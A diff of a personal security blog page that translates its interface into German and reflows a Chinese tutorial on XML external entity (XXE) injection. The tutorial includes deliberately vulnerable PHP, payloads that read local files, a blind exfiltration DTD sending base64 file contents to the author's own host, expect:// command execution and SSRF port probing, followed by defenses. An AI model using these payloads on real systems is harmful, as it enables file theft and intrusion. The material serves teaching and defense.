@@ -120,7 +120,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Search" href="javascript:;">
+                <a class="navbar-item search" title="Suche" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -145,7 +145,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    8 minutes read (About 1243 words)
+                    8 minutes lesen (Über 1243 Worte)
                 </span>
                 
                 
@@ -160,20 +160,69 @@
         <div class="content">
             <script type="text/javascript" src="/js/src/bai.js"></script>
 
-<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>XXE漏洞全称叫做XML外部实体注入漏洞，说白了就是程序中xml可控，而且支持引用外部实体定义DTD从而造成此漏洞。<br><a id="more"></a></p>
-<h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p>XML分为三个部分：XML声明，文档类型定义(DTD)，文档元素。<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"><br>我们主要来看DTD。<br><strong>DTD作用是定义XML文档的合法构建模块，DTD可以在xml文档内声明，也可以外部引用。</strong><br>内部声明DTD：</p>
+<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>XXE漏洞全称叫做XML外部实体注入漏洞，说白了就是程序中xml可控，而且支持引用外部实体定义DTD从而造成此漏洞。</p>
+<a id="more"></a>
+<h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p>XML分为三个部分：XML声明，文档类型定义(DTD)，文档元素。</p>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er">
+<p>我们主要来看DTD。<br><strong>DTD作用是定义XML文档的合法构建模块，DTD可以在xml文档内声明，也可以外部引用。</strong><br>内部声明DTD：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
-<p>引用外部DTD<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><br>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>内部声明实体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><br>引用外部实体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><br>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。<br><strong>恶意外部引用：</strong><br>一。<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><br>二。<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><br>DTD文件(evil.dtd)内容：<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><br>三。<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><br>不同程序支持的协议不一样：<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><br>PHP支持的扩展协议有：<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"></p>
-<h3 id="XXE的危害"><a href="#XXE的危害" class="headerlink" title="XXE的危害"></a>XXE的危害</h3><p>一.读取任意文件<br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     demo1</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-04-22</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="comment">//php支持解析的xml代码</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"><span class="keyword">echo</span> $creds;</span><br></pre></td></tr></table></figure><br>poc:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line">?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM <span class="string">"file:///d:/1.txt"</span>&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><br><strong>上面代码是post传参，如果是get传参需要url编码一下。</strong><br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><br>成功读取本地文件内容。</p>
-<p>上面所诉的xxe是回显的，但是在一般情况下xxe是不回显而是用于配置文件。所以我们需要另一种方法：数据外带。<br>原理很简单：就是在一次请求中访问我们自己的vps，而在这个请求之中包含着获取数据的请求.这样就可以让数据回显到我们的vps上。<br>这个有个注意点：<strong>根据规范，我们必须在DTD文件中才能完成”请求中引用另一次的请求的结果”的要求。</strong><br>操作：无回显的XXE<br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     demo1</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-04-22</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="comment">//php支持解析的xml代码</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br></pre></td></tr></table></figure><br>da4er.dtd:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=file:///D:/1.txt"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://192.168.1.103:9999?p=%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><br>poc:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103/da4er.dtd"</span>&gt;</span><br><span class="line">%dtd;%int;%send; ]&gt;</span><br><span class="line">&lt;convert&gt;%dtd;%int;%send;&lt;/convert&gt;</span><br></pre></td></tr></table></figure><br>这里需要注意几点：<br>1.dtd中send前面的%号要换成html实体编码，因为：实体中不能存在%<br>2.调用逻辑：1.看poc最后一行，首先调用%dtd发送http请求访问192.168.1.103上的da4er.dtd文件；然后调用%int，最后调用%send发送数据到9999端口中。<br>最后成功得到base64加密的数据：<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er"><br>二。RCE<br>如果PHP安装了expect扩展，是可以执行rce的。<br>这种情况很少见，并不是传统意义上的任意命令执行，只是因为环境的特殊配置，导致XML与某些命令操作关联，进而造成了命令执行。当PHP环境中的PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，就会造成我们说的这种情况，在这里，我们不做展开讲解。<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="Da4er"><br>poc:</p>
+<p>引用外部DTD</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>内部声明实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>引用外部实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。<br><strong>恶意外部引用：</strong><br>一。</p>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er">
+<p>二。</p>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er">
+<p>DTD文件(evil.dtd)内容：</p>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er">
+<p>三。</p>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er">
+<p>不同程序支持的协议不一样：</p>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er">
+<p>PHP支持的扩展协议有：</p>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er">
+
+<h3 id="XXE的危害"><a href="#XXE的危害" class="headerlink" title="XXE的危害"></a>XXE的危害</h3><p>一.读取任意文件<br>代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     demo1</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-04-22</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="comment">//php支持解析的xml代码</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"><span class="keyword">echo</span> $creds;</span><br></pre></td></tr></table></figure>
+<p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line">?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM <span class="string">"file:///d:/1.txt"</span>&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>上面代码是post传参，如果是get传参需要url编码一下。</strong></p>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er">
+<p>成功读取本地文件内容。</p>
+<p>上面所诉的xxe是回显的，但是在一般情况下xxe是不回显而是用于配置文件。所以我们需要另一种方法：数据外带。<br>原理很简单：就是在一次请求中访问我们自己的vps，而在这个请求之中包含着获取数据的请求.这样就可以让数据回显到我们的vps上。<br>这个有个注意点：<strong>根据规范，我们必须在DTD文件中才能完成”请求中引用另一次的请求的结果”的要求。</strong><br>操作：无回显的XXE<br>代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     demo1</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-04-22</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="comment">//php支持解析的xml代码</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br></pre></td></tr></table></figure>
+<p>da4er.dtd:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=file:///D:/1.txt"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://192.168.1.103:9999?p=%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103/da4er.dtd"</span>&gt;</span><br><span class="line">%dtd;%int;%send; ]&gt;</span><br><span class="line">&lt;convert&gt;%dtd;%int;%send;&lt;/convert&gt;</span><br></pre></td></tr></table></figure>
+<p>这里需要注意几点：<br>1.dtd中send前面的%号要换成html实体编码，因为：实体中不能存在%<br>2.调用逻辑：1.看poc最后一行，首先调用%dtd发送http请求访问192.168.1.103上的da4er.dtd文件；然后调用%int，最后调用%send发送数据到9999端口中。<br>最后成功得到base64加密的数据：</p>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er">
+<p>二。RCE<br>如果PHP安装了expect扩展，是可以执行rce的。<br>这种情况很少见，并不是传统意义上的任意命令执行，只是因为环境的特殊配置，导致XML与某些命令操作关联，进而造成了命令执行。当PHP环境中的PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，就会造成我们说的这种情况，在这里，我们不做展开讲解。</p>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="Da4er">
+<p>poc:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"expect://whami"</span>&gt;</span><br><span class="line"> %dtd;]&gt;</span><br></pre></td></tr></table></figure>
-<p>三。XXE配合SSRF攻击内网<br>看到XXE的攻击姿势我们就应该想到xxe是和ssrf一样，可以对内网进行攻击。其实ssrf算不上一个漏洞而是一种攻击模式。<br>探测端口<br>poc:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103:80"</span>&gt;</span><br><span class="line"> %dtd;]&gt;</span><br></pre></td></tr></table></figure><br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="Da4er"><br>poc:</p>
+<p>三。XXE配合SSRF攻击内网<br>看到XXE的攻击姿势我们就应该想到xxe是和ssrf一样，可以对内网进行攻击。其实ssrf算不上一个漏洞而是一种攻击模式。<br>探测端口<br>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103:80"</span>&gt;</span><br><span class="line"> %dtd;]&gt;</span><br></pre></td></tr></table></figure>
+<img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="Da4er">
+<p>poc:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103:3305"</span>&gt;</span><br><span class="line"> %dtd;]&gt;</span><br></pre></td></tr></table></figure>
 <img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class title="Da4er">
 <p>发现端口开放和不开放的返回结果不同。<br>xxe还有很多攻击内网的姿势：内网主机探测，钓鱼等。像strust2和内网未授权的redis可以直接getshell</p>
-<h3 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h3><p>1.使用开发语言提供的禁用外部实体的方法<br>php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><br>java:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><br>python<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><br>2.过滤用户提交的XML数据<br>过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。<br>3.不允许XML中含有自己定义的DTD</p>
+<h3 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h3><p>1.使用开发语言提供的禁用外部实体的方法<br>php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+<p>java:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<p>python</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
+<p>2.过滤用户提交的XML数据<br>过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。<br>3.不允许XML中含有自己定义的DTD</p>
 
         </div>
         
@@ -186,7 +235,7 @@
 
 <div class="card">
     <div class="card-content">
-        <h3 class="menu-label has-text-centered">Like this article? Support the author with</h3>
+        <h3 class="menu-label has-text-centered">Gefällt Ihnen der Artikel? Unterstützen Sie den Autor mit</h3>
         <div class="buttons is-centered">
             
                 
@@ -291,7 +340,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Categories
+                Kategorien
             </h3>
             <ul class="menu-list">
             <li>
@@ -421,7 +470,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -446,7 +495,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -475,7 +524,7 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -580,7 +629,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -748,7 +797,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -773,7 +822,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -802,7 +851,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -907,7 +956,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -1156,7 +1205,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 
-<a id="back-to-top" title="Back to Top" href="javascript:;">
+<a id="back-to-top" title="Zurück nach oben" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
@@ -1180,7 +1229,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Tippen Sie etwas..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1193,10 +1242,10 @@ document.addEventListener('DOMContentLoaded', function () {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
                 POSTS: 'Posts',
-                PAGES: 'Pages',
-                CATEGORIES: 'Categories',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
                 TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                UNTITLED: '(Unbenannt)',
             },
             CONTENT_URL: '/content.json',
         };
